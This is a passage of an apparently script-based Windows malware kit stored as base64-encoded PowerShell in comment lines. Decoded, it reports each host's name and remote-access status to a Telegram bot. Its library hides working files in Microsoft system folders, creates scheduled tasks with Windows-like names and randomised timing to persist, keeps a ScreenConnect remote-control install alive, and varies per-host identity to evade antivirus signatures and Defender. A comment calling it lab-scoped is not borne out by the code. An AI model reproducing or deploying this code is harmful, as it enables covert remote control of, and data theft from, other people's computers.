::CiAgICAkZ3J5eGFMaW5lID0gR2V0LVN2Y0xpbmUgKCJTY3JlZW5Db25uZWN0IENs
::aWVudCAoezB9KSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkpDQogICAgJGdyeXhhU2hv
::cnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
::bHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01Q
::VVRFUk5BTUUpfHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFs
::dFNob3J0fGY9JGZvcmVpZ25OfHQ9JHRhc2tPay81fGI9JEJ1aWxkIg0KfQ0KDQpp
::ZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhpdHMgPSBAKCgk
::cm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7
::MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0
::ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0g
::Li4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0
::ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FU
::RUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxvZyA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRnKFtzdHJp
::bmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAg
::ICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQog
::ICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAg
::ZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYg
::KCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9DQogICAgJGpz
::b24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
::NQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0
::Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBz
::Oi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVz
::c2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29u
::dGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnIHwgT3V0
::LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBb
::c3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkgew0K
::ICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAg
::ICByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAg
::ICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAw
::MCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUNCiAgICAgICAg
::ICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAg
::IHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5IHsNCiAg
::ICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAg
::ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19z
::ZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBl
::bHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBp
::ZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95
::T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lf
::dGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5
::IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxb
::Xj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRp
::bGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxl
::bmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1
::MDApICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cg
::JHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQg
::LUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBB
::ZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIg
::KyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNDgNCiMgTDQ4OiBIRUFMVEhZIHJlcXVpcmVzIGdyeXhhLmNvbSBJbWFnZVBh
::dGggKGJhcmUgc2MgY3JlYXRlIHdhcyBmYWxzZSBIRUFMVEhZIOKGkiBIRUFMIC94
::IGtpbGxlZCBHdWVzdHMpLg0KIyBMNDc6IHNjLmV4ZSBmb3IgU0MgZXhpc3RlbmNl
::L3J1bm5pbmcgKEdldC1TZXJ2aWNlIGZhbHNlIEFCU0VOVCBjYXVzZWQgYmFkIGhl
::YWxzKS4NCiMgTDQ2OiBGUkVFWkUgLSBuZXZlciBhdXRvIG1zaWV4ZWMgZnJvbSBt
::b24vYm9vdDsgc3RhcnQtb25seS4gTWFudWFsIGZvcmNlIG9ubHkuDQojIEw0NTog
::SEFORFMtT0ZGIGFsbCBTY3JlZW5Db25uZWN0IGV4Y2VwdCBHcnl4YSBpbnN0YWxs
::LWlmLWFic2VudC4NCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5
::IChhbnRpLXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZw0KIyAobXV0dWFsIHBlcnNp
::c3RlbmNlIGNoYWluKSwgY2FtcGFpZ24gc3RhdGUgZmlsZSwgU0Mgc2VydmljZSBy
::ZXBhaXIuDQojIEw0NDogSEFSRCBsb2NrIOKAlCBhbnkgbGl2ZSBHcnl4YSA9PiBu
::ZXZlciBtaWdyYXRlL3VuaW5zdGFsbC9pOyBubyBkZWZlcnJlZCAveDsgcHJvdGVj
::dCBtdXN0IGVtcHR5IFVwZ3JhZGUuDQojIEw0MzogVGVzdC1TY1J1bm5pbmcgaW5j
::bHVkZXMgU3RhcnRQZW5kaW5nOyBuZXZlciAveCB3aGVuIHNlcnZpY2UgZXhpc3Rz
::IChjb25uZWN0LWRyb3AgcmFjZSkuDQojIEw0MjogRlAgbWlncmF0ZSBpbnN0YWxs
::LW5ldy1GSVJTVCB0aGVuIGRlZmVyLXJlbW92ZS1vbGQgKG5ldmVyIGxlYXZlIGhv
::c3Qgd2l0aCB6ZXJvIEdyeXhhKS4NCiMgTDQxOiAtRm9yY2UgTkVWRVIgL3grL2kg
::d2hlbiBHcnl4YSBhbHJlYWR5IFJ1bm5pbmcgKGZvcmNlX2dyeXhhLmZsYWcgd2Fz
::IGtpbGxpbmcgbGl2ZSBHdWVzdCkuDQojIEwzOTogcmVsYXktdmVyaWZpZWQgR3J5
::eGEga2VlcGVyIGFkb3B0aW9uOyBJTkZMSUdIVOKJoEhFQUxUSFk7IHJlYWwgLUZv
::cmNlLy1EZWVwOw0KIyAgICAgIHBvc3QtR3J5eGEgL2kgc2V2cnogcmVzdG9yZTsg
::VGVzdC1Nc2lQYWNrYWdlOyBUQVNLX0cgaW4gc3RhdGU7IHBlcnNpc3RlbmNlIHB1
::cmdlIHcvbyBGUC1vbmx5Lg0KIyBMMzg6IFRBU0tfRyBXdWNhY2hlR3J5eGFCb290
::IE9OU1RBUlQgcnVucyBncnl4YS1lbnN1cmUgLU5vV2FpdCAtRm9yY2UgYXQgYm9v
::dCAoRGVmZW5kZXIgc3RyaXBzIFNDTSBlbnRyeSBhdCBzdGFydHVwKS4gTDM3OiBN
::U0kgbWFnaWMrRlAgdmFsaWRhdGUuDQojIEwyMTogc3R1Y2sgcmVnaXN0ZXJlZCAo
::c3ZjK2RpciBnb25lKSAtPiAvZmEgdGhlbiBBUlAgbnVrZSArIHNhbWUtRlAgL2k7
::IHJldHVybiBmaXguDQojIEwyMDogLURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBz
::dGFydC9yZXBhaXIgKHJhdGUtbGltaXQgbGVmdCBHcnl4YSBTdG9wcGVkKS4NCiMg
::TDE5OiByYXRlLWxpbWl0IG5ldmVyIGJsb2NrcyB3aGVuIEdyeXhhIGZ1bGx5IGFi
::c2VudDsgU3RhcnRQZW5kaW5nIGtlZXAuDQojIEwxODogZXh0ZXJtaW5hdGUgd2Fz
::IEtJTExJTkcgR3J5eGEgKG51bGwtcGF0aCBwcm9jIGtpbGwpOyBzeW5jIEZQIGJl
::Zm9yZSBraWxsLg0KIyBMMTc6IEdyeXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxlIGFu
::eSBub24tc2V2cnogU0MgUnVubmluZzsgRlAgZHJpZnQgbmV2ZXIgL3guDQojIEwx
::NjogTkVWRVIgcmVpbnN0YWxsIEdyeXhhIHdoZW4gUnVubmluZyAocGFuZWwgZHVw
::bGljYXRlcyk7IFRDUCBhZHZpc29yeSBvbmx5Lg0KIyBMMTU6IGdyeXhhLWhlYWx0
::aCAvIGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVjayAoVENQL3JlbGF5L0ZQ
::IGRyaWZ0IHJlaW5zdGFsbCkuDQojIEwxMzogc2NodGFza3MgQ3JlYXRlIHZpYSBj
::bWQgKGxpa2UgV3VjYWNoZU93biksIFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwud3Vj
::YWNoZQ0KIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwg
::L1NUIDAwOjAwIG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLg0KIyBMMTI6IElERU5U
::VkVSPTcgUk9PVC1sZXZlbCB0YXNrIG5hbWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdp
::bmRvd3MgQWNjZXNzIERlbmllZCkuDQojIEwxMTogTkVWRVIgcmV1c2UgcmVhbCBX
::aW5kb3dzIGJ1aWx0LWluIHRhc2sgbmFtZXM7IFRSIG93bmVyc2hpcCBjaGVja3Mu
::DQojIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRp
::dGlvbiBzY29wZSBvbmx5Lg0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZANCltDbWRsZXRCaW5kaW5nKCldDQpwYXJhbSgNCiAg
::ICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICBbVmFsaWRhdGVT
::ZXQoJ2luaXQnLCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tz
::LWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0
::ZXJlZCcsICdleHRlcm1pbmF0ZScsICdncnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5z
::dXJlJywgJ3N5bmMtZ3J5eGEtZnAnLCAndGVzdC1tc2knLCAncHJvdGVjdC1tc2kn
::LCAndmVyaWZ5LXVwZGF0ZScsICdzeW5jLXNldnJ6LWZwJyldDQogICAgW3N0cmlu
::Z10kQWN0aW9uLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURh
::dGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtz
::dHJpbmddJE1vblBhdGggPSAnJywNCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1
::JywNCiAgICBbc3RyaW5nXSRFeHRyYSAgPSAnJywNCiAgICBbc3RyaW5nXSRGcCAg
::ICAgPSAnJywNCiAgICBbc3dpdGNoXSREZWVwLA0KICAgIFtzd2l0Y2hdJEZvcmNl
::LA0KICAgIFtzd2l0Y2hdJE5vV2FpdA0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJl
::bmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokY2ZnUGF0aCA9IEpvaW4tUGF0aCAk
::V29ya0RpciAnaWRlbnRpdHkuY2ZnJw0KJElkZW50VmVyc2lvbiA9IDgNCg0KIyBS
::b290LWxldmVsIG5hbWVzIFdJVEhPVVQgbGVhZGluZyBiYWNrc2xhc2ggKG1hdGNo
::ZXMgd29ya2luZyBXdWNhY2hlT3duIHN0eWxlKS4NCiRQb29scyA9IEB7DQogICAg
::QSA9IEAoJ1dlclF1ZXVlU3luYycsJ0RpYWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNh
::Y2hlJywnV2RpSG9zdFByb3h5JywnUGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25m
::bGljdFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykNCiAgICBC
::ID0gQCgnUGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnV2VyUXVldWVT
::eW5jJywnTmV0VHJhY2VDYWNoZScsJ0RpYWdIb3N0Q2FjaGUnLCdUY3BJcENvbmZs
::aWN0UmVzJywnUGxhU2VydmVyRGlhZycsJ1NyQ2FjaGVTeW5jJykNCiAgICBDID0g
::QCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxp
::Y3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9z
::dENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpDQogICAgRCA9
::IEAoJ1RjcElwQ29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFj
::ZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1
::ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknKQ0KfQ0KJERl
::ZmF1bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnV2VyUXVldWVTeW5j
::Jw0KICAgIFRBU0tfQiA9ICdQbGFTZXJ2ZXJIZWFsdGgnDQogICAgVEFTS19DID0g
::J1dkaUhvc3RQcm94eScNCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycN
::CiAgICBNT19BICAgPSAnMicNCiAgICBNT19CICAgPSAnMycNCn0NCg0KZnVuY3Rp
::b24gR2V0LUhvc3RTZWVkIHsNCiAgICAkcyA9IDBMDQogICAgZm9yZWFjaCAoJGMg
::aW4gJGVudjpDT01QVVRFUk5BTUUuVG9VcHBlcigpLlRvQ2hhckFycmF5KCkpIHsg
::JHMgPSAoJHMgKiAzMSArIFtpbnRdJGMpICUgMTAwMDAwMDAwNyB9DQogICAgcmV0
::dXJuICRzDQp9DQoNCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgew0KICAgICRpZCA9
::ICREZWZhdWx0cy5DbG9uZSgpDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkg
::ew0KICAgICAgICBmb3JlYWNoICgkbGluZSBpbiAoR2V0LUNvbnRlbnQgLUxpdGVy
::YWxQYXRoICRjZmdQYXRoIC1Gb3JjZSkpIHsNCiAgICAgICAgICAgIGlmICgkbGlu
::ZSAtbWF0Y2ggJ15ccyooW0EtWl9dKylccyo9XHMqKC4rPylccyokJykgeyAkaWRb
::JG1hdGNoZXNbMV1dID0gJG1hdGNoZXNbMl0gfQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkaWQNCn0NCg0KZnVuY3Rpb24gUmVtb3ZlLVRhc2tRdWlldChb
::c3RyaW5nXSR0bikgew0KICAgIGlmICgkdG4pIHsgJiBzY2h0YXNrcy5leGUgL0Rl
::bGV0ZSAvVE4gJHRuIC9GIDI+JjEgfCBPdXQtTnVsbCB9DQp9DQoNCmZ1bmN0aW9u
::IEdldC1UYXNrVmVyYm9zZUJsb2IoW3N0cmluZ10kdG4pIHsNCiAgICBpZiAoLW5v
::dCAkdG4pIHsgcmV0dXJuICcnIH0NCiAgICAkb3V0ID0gJiBzY2h0YXNrcy5leGUg
::L1F1ZXJ5IC9UTiAkdG4gL0ZPIExJU1QgL1YgMj4kbnVsbA0KICAgIGlmICgkTEFT
::VEVYSVRDT0RFIC1uZSAwIC1vciAtbm90ICRvdXQpIHsgcmV0dXJuICcnIH0NCiAg
::ICByZXR1cm4gKCgkb3V0IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0pIC1qb2lu
::ICJgbiIpDQp9DQoNCmZ1bmN0aW9uIFRlc3QtVGFza093bnNNb24oW3N0cmluZ10k
::dG4sIFtzdHJpbmddJG1hcmtlcikgew0KICAgICMgVHJ1ZSBvbmx5IGlmIHRoZSBz
::Y2hlZHVsZWQgYWN0aW9uIHBvaW50cyBhdCBPVVIgbW9uL2V0bCBwYXRoIOKAlCBu
::b3QgYSBXaW5kb3dzIENPTSBoYW5kbGVyLg0KICAgICRibG9iID0gR2V0LVRhc2tW
::ZXJib3NlQmxvYiAkdG4NCiAgICBpZiAoLW5vdCAkYmxvYikgeyByZXR1cm4gJGZh
::bHNlIH0NCiAgICBpZiAoJG1hcmtlciAtYW5kICgkYmxvYiAtbWF0Y2ggW3JlZ2V4
::XTo6RXNjYXBlKCRtYXJrZXIpKSkgeyByZXR1cm4gJHRydWUgfQ0KICAgIGlmICgk
::YmxvYiAtbWF0Y2ggJyg/aSlcLnd1Y2FjaGVcXHxvd25fbW9uXC5jbWR8ZXRsX21v
::blwuY21kfFwuZXRsY2FjaGVcXCcpIHsgcmV0dXJuICR0cnVlIH0NCiAgICByZXR1
::cm4gJGZhbHNlDQp9DQoNCmZ1bmN0aW9uIEluaXRpYWxpemUtSWRlbnRpdHkgew0K
::ICAgICMgSWRlbXBvdGVudCB3aXRoaW4gYW4gSURFTlRWRVIgZ2VuZXJhdGlvbi4g
::UG9vbCB1cGdyYWRlcyBidW1wIElERU5UVkVSOg0KICAgICMgb3duZWQgb2xkLW5h
::bWUgdGFza3MgYXJlIGRlbGV0ZWQ7IFdpbmRvd3MgYnVpbHQtaW5zIHdpdGggc2Ft
::ZSBuYW1lIGFyZSBsZWZ0IGFsb25lLg0KICAgIGlmIChUZXN0LVBhdGggJGNmZ1Bh
::dGgpIHsNCiAgICAgICAgJG9sZCA9IFJlYWQtSWRlbnRpdHkNCiAgICAgICAgIyBM
::NzogYWxzbyByZWdlbmVyYXRlIGlmIGFueSBUQVNLXyogaXMgZW1wdHkgKEw0LUw2
::IG1vZHVsby9jYXN0IGJ1Z3MgbGVmdCBibGFuayBzbG90cykNCiAgICAgICAgJHNs
::b3RzT2sgPSAoJG9sZFsnSURFTlRWRVInXSAtZXEgIiRJZGVudFZlcnNpb24iKSAt
::YW5kICRvbGRbJ1RBU0tfQSddIC1hbmQgJG9sZFsnVEFTS19CJ10gLWFuZCAkb2xk
::WydUQVNLX0MnXSAtYW5kICRvbGRbJ1RBU0tfRCddDQogICAgICAgIGlmICgkc2xv
::dHNPaykgeyByZXR1cm4gJG9sZCB9DQogICAgICAgIGZvcmVhY2ggKCRrIGluICdU
::QVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNLX0QnKSB7DQogICAgICAgICAg
::ICAkdG4gPSBbc3RyaW5nXSRvbGRbJGtdDQogICAgICAgICAgICBpZiAoLW5vdCAk
::dG4pIHsgY29udGludWUgfQ0KICAgICAgICAgICAgIyBOZXZlciBkZWxldGUgYSBy
::ZWFsIFdpbmRvd3MgdGFzayB3ZSBuZXZlciBvd25lZCAoVFIgaXMgQ09NL2N1c3Rv
::bSBoYW5kbGVyKS4NCiAgICAgICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0
::biAnJykgeyBSZW1vdmUtVGFza1F1aWV0ICR0biB9DQogICAgICAgIH0NCiAgICAg
::ICAgUmVtb3ZlLUl0ZW0gLUxpdGVyYWxQYXRoICRjZmdQYXRoIC1Gb3JjZQ0KICAg
::IH0NCiAgICAkcyA9IEdldC1Ib3N0U2VlZA0KICAgICMgTDQ6IHR3byBzbG90cyBt
::YXkgaGFzaCB0byB0aGUgc2FtZSB0YXNrIHBhdGggKHBvb2xzIHNoYXJlIG5hbWVz
::KSAtPg0KICAgICMgb25lIHBoeXNpY2FsIHRhc2sgdGhlbiBzYXRpc2ZpZXMgdHdv
::IHNsb3RzIGFuZCB0aGUgZmxlZXQgc2hvd3MgMy80Lg0KICAgICMgV2FsayBlYWNo
::IHBvb2wgZm9yd2FyZCB1bnRpbCB0aGUgcGljayBpcyB1bmlxdWUgYWNyb3NzIHNs
::b3RzLg0KICAgICMgTDY6IHRoZSBvbGQgQChAKCdBJywgJHMgJSA4KSwgLi4uKSBm
::b3JtIHdhcyBkb3VibGUtYnJva2VuIGluIFBTIDUuMToNCiAgICAjIGJhcmUgJSBp
::bnNpZGUgQCgpIHBhcnNlcyBhcyB0aGUgRm9yRWFjaC1PYmplY3QgYWxpYXMgKG5v
::dCBtb2R1bG8pLCBzbyB0aGUNCiAgICAjIGNvbGxlY3Rpb24gY29sbGFwc2VkIGFu
::ZCB0aGUgbG9vcCBuZXZlciByYW4gLT4gaWRlbnRpdHkuY2ZnIGhhZCBFTVBUWQ0K
::ICAgICMgVEFTS18qIGFuZCB0aGUgd2hvbGUgZmxlZXQgZmVsbCBiYWNrIHRvIGlk
::ZW50aWNhbCBkZWZhdWx0IHRhc2sgbmFtZXMuDQogICAgJHNlZWRzID0gW29yZGVy
::ZWRdQHsNCiAgICAgICAgQSA9ICgkcyAlIDgpDQogICAgICAgIEIgPSAoKCRzICsg
::MykgJSA4KQ0KICAgICAgICBDID0gKCgkcyArIDUpICUgOCkNCiAgICAgICAgRCA9
::ICgoJHMgKyA3KSAlIDgpDQogICAgfQ0KICAgICRwaWNrID0gW29yZGVyZWRdQHt9
::DQogICAgZm9yZWFjaCAoJGxldHRlciBpbiAnQScsJ0InLCdDJywnRCcpIHsNCiAg
::ICAgICAgJGkgPSBbaW50XSRzZWVkc1skbGV0dGVyXQ0KICAgICAgICAkbmFtZSA9
::ICRQb29sc1skbGV0dGVyXVskaV0NCiAgICAgICAgJG4gPSAwDQogICAgICAgIHdo
::aWxlICgkcGljay5WYWx1ZXMgLWNvbnRhaW5zICRuYW1lIC1hbmQgJG4gLWx0IDgp
::IHsgJGkgPSAoJGkgKyAxKSAlIDg7ICRuYW1lID0gJFBvb2xzWyRsZXR0ZXJdWyRp
::XTsgJG4rKyB9DQogICAgICAgIGlmICgtbm90ICRuYW1lKSB7ICRuYW1lID0gJERl
::ZmF1bHRzWyJUQVNLXyRsZXR0ZXIiXSB9DQogICAgICAgICRwaWNrWyRsZXR0ZXJd
::ID0gJG5hbWUNCiAgICB9DQogICAgJGNmZyA9IEAoDQogICAgICAgICJUQVNLX0E9
::JCgkcGljay5BKSINCiAgICAgICAgIlRBU0tfQj0kKCRwaWNrLkIpIg0KICAgICAg
::ICAiVEFTS19DPSQoJHBpY2suQykiDQogICAgICAgICJUQVNLX0Q9JCgkcGljay5E
::KSINCiAgICAgICAgIk1PX0E9JCgyICsgKCRzICUgNCkpIiAgICAgICAgICAjIDIt
::NSBtaW4gaml0dGVyDQogICAgICAgICJNT19CPSQoMyArICgoJHMgKyAxKSAlIDMp
::KSIgICAgIyAzLTUgbWluIGppdHRlcg0KICAgICAgICAiU0VFRD0kcyINCiAgICAg
::ICAgIklERU5UVkVSPSRJZGVudFZlcnNpb24iDQogICAgKQ0KICAgIFNldC1Db250
::ZW50IC1MaXRlcmFsUGF0aCAkY2ZnUGF0aCAtVmFsdWUgJGNmZyAtRm9yY2UNCiAg
::ICByZXR1cm4gKFJlYWQtSWRlbnRpdHkpDQp9DQoNCmZ1bmN0aW9uIE5vcm1hbGl6
::ZS1UYXNrTmFtZShbc3RyaW5nXSR0bikgew0KICAgIGlmICgtbm90ICR0bikgeyBy
::ZXR1cm4gJycgfQ0KICAgIHJldHVybiAkdG4uVHJpbSgpLlRyaW1TdGFydCgnXCcp
::DQp9DQoNCmZ1bmN0aW9uIFdyaXRlLU93bkxvZyhbc3RyaW5nXSRtKSB7DQogICAg
::JGxvZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAgdHJ5IHsg
::QWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICRtIC1Gb3JjZSB9
::IGNhdGNoIHt9DQp9DQoNCmZ1bmN0aW9uIEVuc3VyZS1QZXJzaXN0VGFza3Mgew0K
::ICAgICMgTWlycm9yIHdvcmtpbmcgZGV0YWNoIChXdWNhY2hlT3duKTogY21kIHNj
::aHRhc2tzLCBCT09UIFRSIHBhdGgsIC9TVCBvbiBNSU5VVEUuDQogICAgJGlkID0g
::SW5pdGlhbGl6ZS1JZGVudGl0eQ0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRN
::b25QYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQ0KICAg
::ICRib290ID0gSm9pbi1QYXRoICRlbnY6U3lzdGVtUm9vdCAnVGVtcFwud3VjYWNo
::ZScNCiAgICAkZXRsRGlyID0gJ0M6XFByb2dyYW1EYXRhXE1pY3Jvc29mdFxEaWFn
::bm9zaXNcU3RhdGVcLmV0bGNhY2hlJw0KICAgIGZvcmVhY2ggKCRkIGluIEAoJGJv
::b3QsICRldGxEaXIpKSB7DQogICAgICAgIGlmICgtbm90IChUZXN0LVBhdGggLUxp
::dGVyYWxQYXRoICRkKSkgeyBOZXctSXRlbSAtSXRlbVR5cGUgRGlyZWN0b3J5IC1Q
::YXRoICRkIC1Gb3JjZSB8IE91dC1OdWxsIH0NCiAgICB9DQogICAgJGJvb3RNb24g
::PSBKb2luLVBhdGggJGJvb3QgJ293bl9tb24uY21kJw0KICAgICRib290RXRsID0g
::Sm9pbi1QYXRoICRib290ICdldGxfbW9uLmNtZCcNCiAgICAkZXRsTW9uID0gSm9p
::bi1QYXRoICRldGxEaXIgJ2V0bF9tb24uY21kJw0KICAgIGlmIChUZXN0LVBhdGgg
::LUxpdGVyYWxQYXRoICRNb25QYXRoKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0
::ZXJhbFBhdGggJE1vblBhdGggLURlc3RpbmF0aW9uICRib290TW9uIC1Gb3JjZSAt
::RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICBDb3B5LUl0ZW0g
::LUxpdGVyYWxQYXRoICRNb25QYXRoIC1EZXN0aW5hdGlvbiAkYm9vdEV0bCAtRm9y
